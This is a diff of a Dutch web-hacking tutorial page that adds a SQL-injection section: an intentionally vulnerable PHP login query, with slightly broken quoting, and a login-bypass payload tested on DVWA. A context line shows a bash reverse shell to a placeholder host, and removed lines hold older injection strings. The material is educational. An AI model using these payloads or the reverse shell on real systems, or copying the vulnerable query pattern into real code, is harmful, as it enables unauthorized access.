@@ -561,15 +561,29 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam goed hebt, immers er is een dit wachtwoord is incorrect melding verschenen.</p>
 <p><img src="http://gatochhacken.nl/images/web_user_enumerate_geenconclussie.png" alt=""></p>
 <p>Aan dit veld kun je geen conclussies meer verbinden.</p>
+<h2 id="server-side-controle-functionaliteiten">Server-side controle functionaliteiten</h2>
+<h3 id="sql">SQL</h3>
+<p>Voor sommige websites is het niet erg lastig om een SQL injectie uit te voeren. Er word een login formulier ingevuld en de credentials worden rechtstreeks naar een database gestuurd. Een voorbeeld hiervan in PHP kan bijvoorbeeld zo eruit zien:</p>
+<pre><code>&lt;?PHP
+    if (isset($_POST[&#39;submit&#39;]))
+    {
+        $result = mysqli_query($db,&quot;SELECT id FROM users WHERE username=&#39;&quot;.$_POST[&#39;username&#39;].&quot;&#39; AND password=&quot;&#39;.sha256($_POST[&#39;password&#39;]).&#39;&quot; lIMIT 1&quot;);
+        if (mysqli_num_rows($result) == 1)
+        {
+            echo &quot;U bent ingelogd&quot;;
+        }else{
+            echo &quot;Uw gebruikersnaam of wachtwoord zijn fout&quot;;
+        }
+    }
+?&gt; 
+</code></pre><p>Als je in het inlogformulier in een gebruikersnaam nu geldige SQL code schrijft, dan zal deze rechtstreeks in de query ingevoerd worden. Eerst moeten wij uit de quote breken, dus we plaatsen een enkele quote. Dan willen wij graag dat er een geldig resultaat word opgehaald, dus plaatsen wij er een OR 1 achter. Om te voorkomen dat de rest van de query ook nog uitgevoerd zal worden en wij dus een wachtwoord moeten opgeven, gaan wij de rest van de query uitcommenten. Dit doen wij met # -- .</p>
+<p>Onze complete injectie ziet er dan als volgt uit:</p>
+<p><code>&#39; OR 1 # --</code> </p>
+<p>Als je deze injectie invoert in de SQL injectie pagina van DVWA, dan zal je zien dat hij elke gebruiker terug geeft. In het bovenstaande voorbeeld maar 1, de eerste die hij tegen komt.  Op deze manier kan je elke mogelijke (correcte) query invoegen in een onveilig statement.</p>
 <h2 id="client-side-controle-functionaliteiten">Client-side controle functionaliteiten</h2>
 <h3 id="authenticatiefouten">Authenticatiefouten</h3>
 <h3 id="sessie-managment">Sessie managment</h3>
-<h3 id="sql">SQL</h3>
-<p>Eenvoudige injectie </p>
-<p><code>&#39; # --</code> </p>
-<p>Indien het een username / password is en de query moet blijven werken:</p>
-<pre><code>&#39; OR 1=1 OR 1=&#39;
-</code></pre><h3 id="nosql">NoSQL</h3>
+<h3 id="nosql">NoSQL</h3>
 <h3 id="xpath">XPath</h3>
 <h3 id="ldap">LDAP</h3>
 <h3 id="file-uploads">File uploads</h3>
